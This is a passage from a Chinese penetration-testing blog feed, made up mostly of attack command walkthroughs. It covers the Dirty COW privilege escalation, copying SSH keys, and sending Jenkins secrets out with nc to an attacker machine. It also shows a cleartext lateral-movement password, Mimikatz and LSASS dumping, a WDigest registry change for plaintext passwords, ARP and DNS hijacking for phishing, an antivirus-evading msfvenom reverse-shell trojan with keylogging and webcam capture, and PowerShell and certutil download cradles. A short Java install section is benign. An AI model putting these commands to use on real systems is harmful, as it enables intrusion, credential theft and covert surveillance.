class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载exp</span></span><br><span class=\"line\">curl https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msf</span></span><br><span class=\"line\">upload /root/dirtycow-mem.c /tmp</span><br><span class=\"line\">shell</span><br><span class=\"line\">gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread</span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">./dirtycow-mem</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">稳定脏牛漏洞带来对系统的危害：</span></span><br><span class=\"line\">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class=\"line\">echo 1 &gt; /proc/sys/kernel/panic &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_oo</span><br><span class=\"line\">ps &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_unrecovered_nmi &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_io_nmi &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_warn</span><br></pre></td></tr></table></figure>\n<p>（ 3 ）linux 信息收集：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找到敏感文件</span></span><br><span class=\"line\">/opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现存在172.16.250.30 8080的网站，但只允许跳板机访问，可以用ssh做代理转发流量</span> </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找到ssh的私钥文件可以连接到jenkins机器，进行远程登录</span></span><br><span class=\"line\">cat ~/.bash_history</span><br><span class=\"line\">cp ~/.ssh/id_rsa /tmp/id_rsa</span><br><span class=\"line\">chmod 777 id_rsa</span><br><span class=\"line\">download /tmp/id_rsa /root/id_rsa</span><br><span class=\"line\">chmod 0600 id_rsa</span><br><span class=\"line\">ssh -i id_rsa root@172.16.250.30</span><br><span class=\"line\">netstat - tunlp</span><br></pre></td></tr></table></figure>\n<p>（ 4 ）msf 设置代理将端口转发</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">set</span></span></span><br><span class=\"line\">use auxiliary/server/server/socks_proxy</span><br><span class=\"line\">set srvport 2222</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">conf</span></span><br><span class=\"line\">jobs 查看当前工作是否正常</span><br><span class=\"line\">vim /etc/proxychains4.conf</span><br><span class=\"line\">dynamic_chain 只需保证一个代理正确即可使用</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">strict_chain 需保证每一个代理都准确</span></span><br></pre></td></tr></table></figure>\n<p>（ 5 ）Jenkins DMZ 后台存储的密钥传输</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">本地用nc接受文件：</span></span><br><span class=\"line\">nc -lvp 1234 &gt; master.key</span><br><span class=\"line\">nc -lvp 1234 &gt; hudson.util.Secret</span><br><span class=\"line\">nc -lvp 1234 &gt; credentials.xml</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">肉鸡用nc将文件反向传输出去：</span></span><br><span class=\"line\">nc 172.16.250.128 1234 &lt; /home/jenkins/secrets/hudson.util.Secret</span><br><span class=\"line\">nc 172.16.250.128 1234 &lt; /home/jenkins/secrets/master.key</span><br><span class=\"line\">nc 172.16.250.128 1234 &lt; /home/jenkins/credentials.xml</span><br></pre></td></tr></table></figure>\n<p>（ 6 ）破解密匙：<br>\n项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NoZWV0ei9qZW5raW5zLWRlY3J5cHQ=\">https://github.com/cheetz/jenkins-decrypt</span><br>\n <code>python decrypt.py master.key hudson.util.Secret credentials.xml</code></p>\n<p>（ 7 ）Database DMZ 权限获取<br>\n密码横向： <code>ssh db_backup@172.16.250.50</code> <br>\n)uDvra{4UL^;r?*h<br>\n 权限提升：getuid 及 sudo su</p>\n<h4 id=\"密码获取\"><a class=\"markdownIt-Anchor\" href=\"#密码获取\">#</a> 密码获取</h4>\n<ul>\n<li>Linux 密码获取及破解</li>\n</ul>\n<p>（ 1 ）密码读取 - 没啥用、适用版本少：<br>\n项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2h1bnRlcmdyZWdhbC9taW1pcGVuZ3Vpbg==\">https://github.com/huntergregal/mimipenguin</span><br>\n 使用方法：sh <span class=\"exturl\" data-url=\"aHR0cDovL21pbWlwZW5ndWluLnNo\">mimipenguin.sh</span></p>\n<p>（ 2 ）密码破解（SHA 512 居多）- 不容易破解：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据shadow获取root密码进行破解</span></span><br><span class=\"line\">cat /etc/shadow</span><br><span class=\"line\">hashcat.exe -a 3 -m 1800 linuxhash.txt pass.txt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">加密形式</span></span><br><span class=\"line\">linux sha512crypt $6$, SHA512 (Unix)加密方式：hashcat -m 1800 sha512linux.txt p.txt</span><br><span class=\"line\">linux sha256crypt $5$, SHA256 (Unix)加密方式：hashcat -m 7400 sha256linux.txt p.txt</span><br><span class=\"line\">linux md5crypt, MD5 (Unix), Cisco-IOS$1$ (MD5)加密方式：hashcat -m 500 linuxmd5.txt p.txt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">linux下bcrypt <span class=\"variable\">$2</span>*$, Blowfish加密方式：</span></span><br><span class=\"line\">hashcat -m 3200 linuxmd5.txt p.txt</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Windows 密码获取</li>\n</ul>\n<p>微软为了防止明文密码泄露发布了补丁 KB2871997，关闭了 Wdigest 功能。 当系统为 win10 或 2012R2 以上时，默认在内存缓存中禁止保存明文密码，Win dows-Mimikatz 会无法导出明文，此时可以通过修改注册表的方式抓取明文，但 需要用户重新登录后才能成功抓取。获取明文信息可以方便横向移动，可以有 更多的字典组合，明文要比 hash 要好用的多。</p>\n<p>（ 1 ）在线读</p>\n<p>工具地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHo=\">https://github.com/gentilkiwi/mimikatz</span><br>\n`mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”``</p>\n<p>（ 2 ）离线读</p>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3N5c2ludGVybmFscy9kb3dubG9hZHMvcHJvY2R1bXA=\">https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</span></p>\n<p>在 2012server 后只能读取到 hash 而不能读取到明文密码，Procdump 是微软 官方的工具，可在命令行将 lsass 导出且杀软不会拦截，针对防护拦截 Mimikat z，用 procdump 将密码或 hash 转储到 lsass，在用本地的 mimikaztz 进行离线解析，或直接从从内存中将数据导出。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">转储 lsass</span></span><br><span class=\"line\">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class=\"line\">mimikatz.exe &quot;sekurlsa::minidump lsass.DMP&quot;</span><br><span class=\"line\">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>\n<p>（ 3 ）解决高版本</p>\n<p>修改注册表 + 强制锁屏 + 等待系统管理员重新登录 + 截取明文密码<br>\n修改注册表来让 Wdigest Auth 保存明文口令方式<br>\n <code>shell reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\ /v UseLogonCredential /t REG_DWORD /d 1</code> <br>\n 再次使用 mimikatz 时，将可以成功导出明文票据</p>\n<p>（ 4 ）HASH 破解<br>\n方法：hashcat 工具 cmd5、 somd5 在线网站</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hashcat使用方法如下：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">字典破解</span></span><br><span class=\"line\">.\\hashcat.exe -a 0 -m 1000 .\\hash.txt .\\pass.txt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">暴力破解</span></span><br><span class=\"line\">hashcat.exe -a 3 -m 1000 518b98ad4178a53695dc997aa02d455c?l?l?l?l?l?s?s?s?d?d</span><br><span class=\"line\">-m 密文类型 </span><br><span class=\"line\">-a 破解类型 ?l 小写 ?s 符号 ?d 数字</span><br></pre></td></tr></table></figure>\n<p>（ 5 ）RDP 凭据抓取<br>\n mstsc 连接过其他机器，如果选择保存凭剧，则可以通过以下方式导出 rdp 密码。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看连接记录</span></span><br><span class=\"line\">cmdkey /list</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查找本地的Credentials</span></span><br><span class=\"line\">dir /a %userprofile%\\appdata\\local\\microsoft\\credentials\\*Credentials记录guidMasterKey值:</span><br><span class=\"line\">mimikatz dpapi::cred /in:C:\\Users\\webadmin\\appdata\\ local\\microsoft\\credentials\\5FBB2585F99BA05366F08E52F1C1740B</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找到guidMasterKey对应的MasterKey:</span></span><br><span class=\"line\">mimikatz sekurlsa::dpapi</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">system权限解密指定的MasterKey凭据：</span></span><br><span class=\"line\">mimikatz dpapi::cred /in:C:\\Users\\webadmin\\appdata\\local\\microsoft\\credential s\\ 5FBB2585F99BA05366F08E52F1C1740B /masterkey:f70e1a641096f1b63731d571b43b33aaf009f6af5a3352504e6ddb3cd158f17eec2d541f18b8289ebf547d871dfb257a6bbbd5232550eb6f26a06d39378da4a5</span><br></pre></td></tr></table></figure>\n<p><strong>凭据导出:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhemVIZWxsL3NhbS10aGUtYWRtaW4=\">https://github.com/WazeHell/sam-the-admin</span></strong><br>\n<strong>python sam_the_admin.py test0/‘xiaodi:admin!@#45’ -dc-ip 192.168.10.20 -shell</strong></p>\n<h4 id=\"父域子域\"><a class=\"markdownIt-Anchor\" href=\"#父域子域\">#</a> 父域子域</h4>\n<p><img data-src=\"/N1h1l157/Safe/image-008.png\" alt></p>\n<p>设置父子域的时候，先设置父域及其控制的两台域用户电脑。对三台电脑 分别配置 ip 地址，并解析到父域的 ip 上，修改三者的计算机名称。对父域的服 务器管理做设置，选择添加角色和功能向导，服务器角色配置中选择域服务， 完成之后将此计算机提升为域控，并添加新林，设定自定义域，netbios 名称等。</p>\n<p>通过在父域上添加新的角色，并使普通计算机以域用户身份加入域即可加 入该父域。子域的设置时，需要在父域上先开启 DNS 的一个开关，然后将子域 按照父域的设置方式添加角色和功能向导，区别在于设置为域控方式为加入域 为现有林，林为父域的信息，并自定义相关内容之后即可成功设置为子域。</p>\n<p>子域控制的计算机，其 dns 解析地址需要设置为子域控的 ip 地址。同父域 管辖的计算机一样，通过给子域管辖的计算机设置新的用户名供其登录。修改 子域控的 dns 解析，首选本身，备选为父域控。而后将最后一台电脑加入到子 域即可。</p>\n<h4 id=\"局域网渗透\"><a class=\"markdownIt-Anchor\" href=\"#局域网渗透\">#</a> 局域网渗透</h4>\n<ul>\n<li>单向欺骗和双向欺骗</li>\n</ul>\n<p>单向欺骗：攻击机伪造数据包后本应该传输给靶机的数据错误的传输给攻 击机，使靶机得不到服务器的响应数据，甚至根本无法将数据包发送出局域网。</p>\n<p>双向欺骗：攻击机一直发送伪造的数据包，欺骗网关自己是靶机，欺骗靶 机自己是网关，同时开启路由转发功能，就可以让靶机在正常上网的情况下截 获网络数据包，所有数据都会经过攻击机再转发给靶机。</p>\n<ul>\n<li>单向断网限制</li>\n</ul>\n<p>科来网络分析系统，科来数据包生成器，封装数据包，给靶机造成假象，认为攻击机才是网关地址，造成靶机无法正常上网。</p>\n<ul>\n<li>双向劫持数据</li>\n</ul>\n<p>Arpspoof Wireshark 科来网络分析系统<br>\n Arpspoof Windows:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsYW5kYXUvYXJwc3Bvb2Y=\">https://github.com/alandau/arpspoof</span><br>\nArpspoof Linux:apt-get install dsniff</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启转发</span></span><br><span class=\"line\">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果不开启转发，流量被检测到之后，对方无法正常通讯网络</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启欺骗</span></span><br><span class=\"line\">arpspoof -i eth0 -t 192.168.1.9 -r 192.168.1.1</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">- i 指定进行arp攻击的网卡、-t 目标主机IP、-r 进行双向攻击、最后为网关的IP地址</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">WireShark&amp;科来网络分析系统：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">分析是否能够捕获到双向劫持靶机上的流量 ip.addr==192.168.1.9</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>双向 DNS 劫持配合钓鱼：</li>\n</ul>\n<p>使用 kali 自带的 ettercap -G 进行 dns 劫持，将目标主机访问特定 url 地址的 流量解析到 ettercap 配置文件中规定的解析地址，一般会在 kali 上开启 apache 服 务进行钓鱼。注意需要清除靶机上的 dns 缓存、浏览器缓存等。</p>\n<p>设置劫持网卡、扫描网卡存活 IP、选择攻击目标 IP、启用 ARP 监听模式、 设置 DNS 劫持规则、启用 DNS 劫持插件。</p>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/",
            "title": "XD22 14 打破常规",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"java19-安装\"><a class=\"markdownIt-Anchor\" href=\"#java19-安装\">#</a> Java19 安装</h3>\n<ul>\n<li>mac 安装 java 19 的操作步骤如下</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载高版本的jdk</span></span><br><span class=\"line\">https://www.oracle.com/java/technologies/downloads/#jdk19-mac</span><br><span class=\"line\">wget https://download.oracle.com/java/19/latest/jdk-19_macos-aarch64_bin.dmg</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">多个java存在时使用高版本的java</span></span><br><span class=\"line\">https://docs.oracle.com/en/java/javase/19/install/installation-jdk-macoshtml#GUID-C5F0BF25-3487-4F33-9275-7000C8E1C58C</span><br><span class=\"line\">java -version</span><br><span class=\"line\">/usr/libexec/java_home -v 19 --exec java -version</span><br></pre></td></tr></table></figure>\n<ul>\n<li>kali 安装 java 19 的操作步骤如下</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取源码地址</span></span><br><span class=\"line\">https://www.oracle.com/java/technologies/downloads/#jdk19-linux</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">将源码下载到/opt/etc目录</span></span><br><span class=\"line\">sudo wget https://download.oracle.com/java/19/latest/jdk-19_linux-aarch64_bin.tar.gz -O /etc/opt/jdk19.tar.gz</span><br><span class=\"line\">sudo tar -zxvf jdk-19_linux-aarch64_bin.tar.gz</span><br><span class=\"line\">sudo cp -r jdk-19/ /usr/bin</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装并注册</span></span><br><span class=\"line\">sudo update-alternatives --install /usr/bin/java java /etc/opt/jdk-19 /bin/java 1</span><br><span class=\"line\">sudo update-alternatives --install /usr/bin/javac javac /etc/opt/jdk-19/bin/javac 1</span><br><span class=\"line\">sudo update-alternatives --set java /etc/opt/jdk-19/bin/java</span><br><span class=\"line\">sudo update-alternatives --set javac /etc/opt/jdk-19/bin/javac</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检查是否成功配置Java环境</span></span><br><span class=\"line\">java -version</span><br></pre></td></tr></table></figure>\n<ul>\n<li>centos install java</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">建议获取jdk的地址</span></span><br><span class=\"line\">https://jdk.java.net</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">需要打开oracle官网，寻找适合操作系统处理器的版本</span></span><br><span class=\"line\">sudo wget https://download.oracle.com/java/19/latest/jdk-19_linux-x64_bin.tar.gz - O /etc/opt/jdk1tar.gz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">让 centos 知道该链接</span></span><br><span class=\"line\">update-alternatives --install /usr/bin/java java</span><br><span class=\"line\">sudo update-alternatives --install /usr/bin/java java /etc/opt/jdk-10.1/bin/java 100</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">更新/etc/alternatives/java链接,选择当前要使用的jdk序号</span></span><br><span class=\"line\">sudo update-alternatives --config java</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注：sudo yum install java-17-openjdk网络问题会失败</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检查是否安装成功</span></span><br><span class=\"line\">java - version</span><br></pre></td></tr></table></figure>\n<h3 id=\"msf-生成木马说明\"><a class=\"markdownIt-Anchor\" href=\"#msf-生成木马说明\">#</a> msf 生成木马说明</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msf生成木马：</span></span><br><span class=\"line\">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= 192 .168.31.18 LPORT= 4444 -b &quot;\\x00&quot; -i 10 -f exe -o ~/Desktop/test.exe</span><br><span class=\"line\"></span><br><span class=\"line\">-a x86 使用x86框架</span><br><span class=\"line\">--platform windows 运行平台为windows</span><br><span class=\"line\">-p windows/meterpreter/reverse_tcp 指定payload</span><br><span class=\"line\">LHOST= 192 .168.200.130 LPORT= 8088 本地IP和监听端口</span><br><span class=\"line\">-b &quot;\\x00&quot; 去掉坏字符</span><br><span class=\"line\">-i 10 编码 10 次，提高免杀概率</span><br><span class=\"line\">-f exe 木马文件格式</span><br><span class=\"line\">-o /var/www/html/test.exe 输出路径</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听端口等待木马执行：</span></span><br><span class=\"line\">msfconsole</span><br><span class=\"line\">use payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 192.168.31.123</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">exploit</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">msf控制后的可执行命令</span></span><br><span class=\"line\">getuid 查看当前权限</span><br><span class=\"line\">getsystem 尝试获取system权限</span><br><span class=\"line\">shell 获取当前权限shell会话</span><br><span class=\"line\">ps 列出正在运行的进程</span><br><span class=\"line\">pkill 按名称终止进程</span><br><span class=\"line\">kill 按PID终止进程</span><br><span class=\"line\">reboot 重启 shutdown 关机</span><br><span class=\"line\">upload 上传文件(格式参考:upload /root/1.txt - &gt; d:/)</span><br><span class=\"line\">download 下载文件(格式参考:download c:/1.txt - &gt; /root/)</span><br><span class=\"line\">keyboard_send 令对方键盘输入(参考格式:keyboard_send ilovecc)</span><br><span class=\"line\">keyscan_start 开始捕获击键（开始键盘记录）</span><br><span class=\"line\">keyscan_dump 转储按键缓冲（下载键盘记录）</span><br><span class=\"line\">keyscan_stop 停止捕获击键（停止键盘记录）</span><br><span class=\"line\">record_mic 麦克风录制(格式参考:record_mic -d 13)</span><br><span class=\"line\">screenshot 截图截取对方目前桌面的截图</span><br><span class=\"line\">webcam_snap 摄像头拍摄一张照片</span><br></pre></td></tr></table></figure>\n<h3 id=\"一句话下载文件\"><a class=\"markdownIt-Anchor\" href=\"#一句话下载文件\">#</a> 一句话下载文件</h3>\n<p>参考链接： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2JvdW50eXRpcHMucGhwP2Rvd25sb2Fk\">https://forum.ywhack.com/bountytips.php?download</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">PowerShell - IWR/IEX</span></span><br><span class=\"line\">powershell.exe -Command &quot;Invoke-WebRequest -Uri http://127.0.0.1:81/exp.exe -OutFile test.exe&quot;</span><br><span class=\"line\">powershell.exe -Command &quot;IEX(New-Object Net.WebClient).DownloadFile(&#x27;http://127.0.0.1:81/exp.exe&#x27;, test.exe)&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CMD - Certutil/SMB</span></span><br><span class=\"line\">CMD - Certutil: certutil.exe -urlcache -split - f http://127.0.0.1:81/exp.exe test.exe</span><br><span class=\"line\">CMD - SMB: copy \\\\127.0.0.1\\files\\exp.exe test.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Linux - wget</span></span><br><span class=\"line\">wget 